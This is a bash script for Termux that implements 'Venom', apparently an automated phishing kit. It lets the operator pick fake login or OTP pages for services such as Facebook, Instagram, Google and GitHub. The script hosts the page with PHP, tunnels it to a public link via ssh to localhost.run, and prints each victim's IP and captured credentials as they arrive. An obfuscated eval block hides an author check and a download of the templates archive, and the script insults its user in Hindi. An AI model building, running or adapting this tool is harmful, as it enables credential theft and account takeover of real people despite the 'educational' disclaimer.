#!/data/data/com.termux/files/usr/bin/bash

##   Venom 	: 	Automated Phishing Tool
##   Author 	: 	https://t.me/nullxvoid 
##   Version 	: 	1.0-test

# Checking Internet connection


ping -c 1 google.com >/dev/null 2>&1
if [ "$?" != '0' ]; then
  printf "Internet tera baap on karega madarchod!!\n"
  exit 1
fi 

# Requirements
z="
";vBz='down';YBz='inst';GBz='[ -d';HCz='ules';hBz='>&1';Qz='ead ';VBz='time';yBz='0-te';fz=' to ';ICz='.tar';eBz=' /de';NCz='2>&1';gz='khud';cz='"\e[';lBz='ps:/';TBz='ke s';Tz='[ $a';kz=' le ';ABz='slee';Uz='utho';wz=' of ';LBz='tall';ECz='tar ';xz='a bi';qBz='4You';Xz='shn ';Bz='or=$';CCz='ar.g';kBz=' htt';pBz='Anon';mBz='/git';rBz='/Ven';fBz='v/nu';IBz='odul';BCz='es.t';Wz=' AUT';XBz='apt ';qz='nage';Pz=' | h';tBz='elea';FCz='-zxf';jBz=' -LO';JCz='.gz ';dBz='-y >';uz=' you';oz='o no';ZBz='all ';vz=' son';Gz='om.s';Iz='grep';EBz=' ""';Hz='h | ';Cz='(cat';MCz='ull ';Lz='HOR=';RBz='. ma';lz='mada';GCz=' mod';az='echo';Jz=' -w ';pz='t ch';dz='31mK';CBz='exit';Zz='then';yz='tch"';UBz='ome ';FBz='fi';sz=' cre';PCz='rf m';rz=' the';LCz='ev/n';HBz=' ".M';Yz=']]; ';WBz='"';iBz='curl';bBz='open';sBz='om/r';KBz='"Ins';xBz='/v1.';OBz='equi';Mz='Alie';MBz='ig a';nBz='hub.';uBz='ses/';cBz='ssh ';ACz='st/m';hz=' se ';tz='dits';DBz='else';aBz='php ';Ez='enom';PBz='reme';Dz=' ~/V';nz='d\nD';wBz='load';QBz='nts.';Sz='if [';iz='code';OCz='rm -';Fz='/ven';Rz='-n1)';gBz='ll 2';ez='abhi';Vz='r !=';bz=' -e ';mz='rcho';jz=' kar';BBz='p 3';DCz='z';SBz='y ta';JBz='es" ';Kz='"AUT';Az='auth';Nz='nkri';oBz='com/';Oz='shn"';NBz='ll r';KCz='> /d';
eval "$Az$Bz$Cz$Dz$Ez$Fz$Gz$Hz$Iz$Jz$Kz$Lz$Mz$Nz$Oz$Pz$Qz$Rz$z$Sz$Tz$Uz$Vz$Wz$Lz$Mz$Nz$Xz$Yz$Zz$z$az$bz$cz$dz$ez$fz$gz$hz$iz$jz$kz$lz$mz$nz$oz$pz$qz$rz$sz$tz$uz$vz$wz$xz$yz$z$ABz$BBz$z$CBz$z$DBz$z$az$EBz$z$FBz$z$Sz$GBz$HBz$IBz$JBz$Yz$Zz$z$az$EBz$z$DBz$z$az$bz$KBz$LBz$MBz$NBz$OBz$PBz$QBz$RBz$SBz$TBz$UBz$VBz$WBz$z$XBz$YBz$ZBz$aBz$bBz$cBz$dBz$eBz$fBz$gBz$hBz$z$iBz$jBz$kBz$lBz$mBz$nBz$oBz$pBz$qBz$rBz$sBz$tBz$uBz$vBz$wBz$xBz$yBz$ACz$IBz$BCz$CCz$DCz$z$ECz$FCz$GCz$HCz$ICz$JCz$KCz$LCz$MCz$NCz$z$OCz$PCz$IBz$BCz$CCz$DCz$z$FBz"

# Banner & Menu Don't change Author name
main(){
clear
echo -e "\e[31m
 ██▒   █▓▓█████  ███▄    █  ▒█████   ███▄ ▄███▓
▓██░   █▒▓█   ▀  ██ ▀█   █ ▒██▒  ██▒▓██▒▀█▀ ██▒
 ▓██  █▒░▒███   ▓██  ▀█ ██▒▒██░  ██▒▓██    ▓██░
  ▒██ █░░▒▓█  ▄ ▓██▒  ▐▌██▒▒██   ██░▒██    ▒██ 
   ▒▀█░  ░▒████▒▒██░   ▓██░░ ████▓▒░▒██▒   ░██▒
   ░ ▐░  ░░ ▒░ ░░ ▒░   ▒ ▒ ░ ▒░▒░▒░ ░ ▒░   ░  ░
   ░ ░░   ░ ░  ░░ ░░   ░ ▒░  ░ ▒ ▒░ ░  ░      ░
     ░░     ░      ░   ░ ░ ░ ░ ░ ▒  ░      ░   
      ░     ░  ░         ░     ░ ░         ░   
     ░                                \e[34mVer 1.0-test\e[0m\e[32m     

Author:${AUTHOR}

\e[33;1m Sellect \e[34;1mvector \e[33;1mFor Your Victim\e[0;1m

[1] Facebook         [11] Google
[2] Instagram        [12] Microsoft
[3] Twitter          [13] Yahoo
[4] Tiktok           [14] Yandex
[5] Pintrest         [15] Github
[6] Snapchat         [16] Gitlab
[7] Linkedin         [17] Mediafire
[8] VK               [18] Protonmail
[9] Reddit           [19] About
[10] Discord         [20] Exit
"
read -p $'\e[31;4mVenom\e[0m set(\e[33mVector\e[0m) > ' vector 
if [[ $vector == 1 ]]; then
  facebook
  elif [[ $vector == 2 ]]; then
    instagram
  elif [[ $vector == 3 ]]; then
    twitter
  elif [[ $vector == 4 ]]; then
    tiktok
  elif [[ $vector == 5 ]]; then
    pintrest
  elif [[ $vector == 6 ]]; then
    snapchat
  elif [[ $vector == 7 ]]; then
    linkedin
  elif [[ $vector == 8 ]]; then
    vk
  elif [[ $vector == 9 ]]; then
    reddit
  elif [[ $vector == 10 ]]; then
    discord
  elif [[ $vector == 11 ]]; then
    google
  elif [[ $vector == 12 ]]; then
    microsoft
  elif [[ $vector == 14 ]]; then
    yahoo
  elif [[ $vector == 14 ]]; then
    yandex
  elif [[ $vector == 15 ]]; then
    github
  elif [[ $vector == 16 ]]; then
    gitlab
  elif [[ $vector == 17 ]]; then
    mediafire
  elif [[ $vector == 18 ]]; then
    protonmail
  elif [[ $vector == 19 ]]; then
    about
  elif [[ $vector == 20 ]]; then
    echo -e "Thanks for using this tool byee!";sleep 2
    exit
  else
    echo -e "Andha hai kya laude..try again";sleep 2
    main
fi
}

facebook(){
  echo -e "\e[0;1m 
[1] Traditional Login Page
[2] Advance voting poll
[3] Fake security page
[4] Messenger Login Page
[5] Facebook OTP
"
read -p $'\e[31;4mVenom\e[0m set(\e[33mFacebook/Vector\e[0m) > ' fb_option
if [[ $fb_option == 1 ]]; then
  website="facebook"
  hosting
  elif [[ $fb_option == 2 ]]; then
    website="fb_advanced"
    hosting
  elif [[ $fb_option == 3 ]]; then
    website="fb_security"
    hosting
  elif [[ $fb_option == 4 ]]; then
    website="fb_messenger"
    hosting
  elif [[ $fb_option == 5 ]]; then
    website="facebook_otp"
    hosting
fi
}

instagram(){
  echo -e "\e[0;1m 
[1] Traditional Login page
[2] Insta follower(1)
[3] Insta follower(2)
[4] Insta Verify
[5] Insta follow OTP
[6] Instagram OTP
"
read -p $'\e[31;4mVenom\e[0m set(\e[33mInsta/Vector\e[0m) > ' ig_option
if [[ $ig_option == 1 ]]; then
  website="instagram"
  hosting 
  elif [[ $ig_option == 2 ]]; then
    website="ig_followers"
    hosting
  elif [[ $ig_option == 3 ]]; then
    website="insta_followers"
    hosting
  elif [[ $ig_option == 4 ]]; then
    website="ig_verify"
    hosting
  elif [[ $ig_option == 5 ]]; then
    website="igfollow_otp"
    hosting 
  elif [[ $ig_option == 6 ]]; then
    website="instagram_otp"
    hosting  
fi
}

twitter(){
  echo -e "
[1] Traditional login page
[2] Twitter OTP page
"
read -p $'\e[31;4mVenom\e[0m set(\e[33mTwitter/Vector\e[0m) > ' tw_option
if [[ $tw_option == 1 ]]; then
  website="twitter"
  hosting
elif [[ $tw_option == 2 ]]; then
  website="twitter_otp"
  hosting
fi
}

tiktok(){
  echo -e "
[1] Traditional login page
[2] Tiktok OTP page
"
read -p $'\e[31;4mVenom\e[0m set(\e[33mTiktok/Vector\e[0m) > ' tk_option
if [[ $tk_option == 1 ]]; then
  website="tiktok"
  hosting
elif [[ $tk_option == 2 ]]; then
  website="tiktok_otp"
  hosting
fi
}

pintrest(){
echo -e "
[1] Traditional login page
[2] Pintrest OTP page 
"
read -p $'\e[31;4mVenom\e[0m set(\e[33mPintrest/Vector\e[0m) > ' pin_option
if [[ $pin_option == 1 ]]; then
  website="pintrest"
  hosting
elif [[ $pin_option == 2 ]]; then
  website="pintrest_otp"
  hosting
  
fi
}

snapchat(){
echo -e "
[1] Traditional login page
[2] Snapchat2 login page
[3] Snapchat OTP
"
read -p $'\e[31;4mVenom\e[0m set(\e[33mSnapchat/Vector\e[0m) > ' snp_option
if [[ $snp_option == 1 ]]; then
  website="snapchat"
  hosting
elif [[ $snp_option == 2 ]]; then
  website="Snapchat2"
  hosting
elif [[ $snp_option == 3 ]]; then
  website="snapchat_otp"
  hosting
fi
}

linkedin(){
echo -e "
[1] Traditional Login page
[2] Linkedin OTP
"
read -p $'\e[31;4mVenom\e[0m set(\e[33mLinkedin/Vector\e[0m) > ' lnk_option
if [[ $lnk_option == 1 ]]; then
  website="linkedin"
  hosting
elif [[ $lnk_option == 2 ]]; then
  website="linkedin_otp"
  hosting
fi
}

vk(){
echo -e "
[1] Traditional login page
[2] VK poll
"
read -p $'\e[31;4mVenom\e[0m set(\e[33mVK/Vector\e[0m) > ' vk_option
if [[ $vk_option == 1 ]]; then
  website="vk"
  hosting
elif [[ $vk_option == 2 ]]; then
  website="vk_poll"
  hosting
fi
}

reddit(){
website="reddit"
hosting
}

discord(){
website="discord"
hosting
}

google(){
echo -e "
[1] Traditional login page
[2] Google old login
[3] Google OTP
[4] Google poll
"
read -p $'\e[31;4mVenom\e[0m set(\e[33mGoogle/Vector\e[0m) > ' ggl_option
if [[ $ggl_option == 1 ]]; then
  website="google"
  hosting
elif [[ $ggl_option == 2 ]]; then
  website="google_old"
  hosting
elif [[ $ggl_option == 3 ]]; then
  website="google_otp"
  hosting
elif [[ $ggl_option == 4 ]]; then
  website="google_poll"
  hosting
fi
}

microsoft(){
website="microsoft"
hosting
}

yahoo(){
website='yahoo'
hosting
}

yandex(){
website="yandex"
hosting
}

github(){
echo -e "
[1] Traditional login page
[2] Github OTP
"
read -p $'\e[31;4mVenom\e[0m set(\e[33mGithub/Vector\e[0m) > ' gt_option
if [[ $gt_option == 1 ]]; then
  website="github"
  hosting
elif [[ $gt_option == 2 ]]; then
  website="github_otp"
  hosting
fi
}

gitlab(){
website="gitlab"
hosting
}

mediafire(){
website="mediafire"
hosting
}

protonmail(){
website="protonmail"
hosting
}

about(){
echo -e "
An automated phishing tool with 15+ templates.
This Tool is made for educational purpose only.
Author will not be responsible for any misuse of this toolkit.
Coded By : ${AUTHOR}
Version : 1.0-test
Github : https://github.com/Anon4You/Venom 

"
}

hosting(){
  if [[ -d ".vnm" ]]; then
    rm -rf .vnm && mkdir .vnm
    else
      mkdir .vnm
  fi
  cp -rf .Modules/$website .vnm
  echo -e "\nif links are not shown relaunch the script $0\n"
  sleep 2
  printf "\e[32;1mStarting PHP server...\r"
  php -S localhost:8080 -t .vnm/$website > /dev/null 2>&1 &
  sleep 2
#  printf "Starting serveo.net...\r"
 # ssh -R 80:localhost:8080 serveo.net > .srvlog 2> /dev/null &
 # sleep 10
  printf "Starting localhost.run...\r"
  ssh -R 80:localhost:8080 nokey@localhost.run > .lhrlog 2> /dev/null &
  sleep 10
#  link=$(grep -o 'https://[-0-9a-z]*\.serveo.net' ".srvlog")
  lhlink=$(grep -o 'https://[-0-9a-z]*\.lhr.life' ".lhrlog")
  rm -rf .lhrlog .srvlog
  echo -e "\e[32;1myour links are given bellow \e[34;1m\n"
#  echo Serveo.net : $link
  echo ""
  echo Localhost.run : $lhlink
  echo -e "\nLocalHost  : http://localhost:8080"
  datafound
}

datafound(){
  echo -e "\n\e[31;1mWaiting for logim info, press CTRL+C to stop\e[0m\n"
  while [[ true ]]; do
    if [[ -e ".vnm/$website/ip.txt" ]]; then
      echo -e "\e[32;1mVictim ip found!\e[0m"
      cat .vnm/$website/ip.txt
      rm -rf .vnm/$website/ip.txt
    fi 
    sleep 0.75
    if [[ -e ".vnm/$website/usernames.txt" ]]; then
      echo -e "\n\e[32;1mLogin info found!\e[0m"
      cat .vnm/$website/usernames.txt
      rm -rf .vnm/$website/usernames.txt
      echo -e "\n\e[31;1mWaiting for next login info press CTRL+C to exit\e[0m\n"
    fi 
    sleep 0.75
  done
}

usr_intrp(){
  printf "\e[0m\e[1;36m\t CTRL+C Pressed!, Exiting...\n"
  rm -rf .vnm
  sleep 2
  exit
}
AUTHOR=Alienkrishn
trap usr_intrp SIGINT
trap usr_intrp SIGTSTP
main
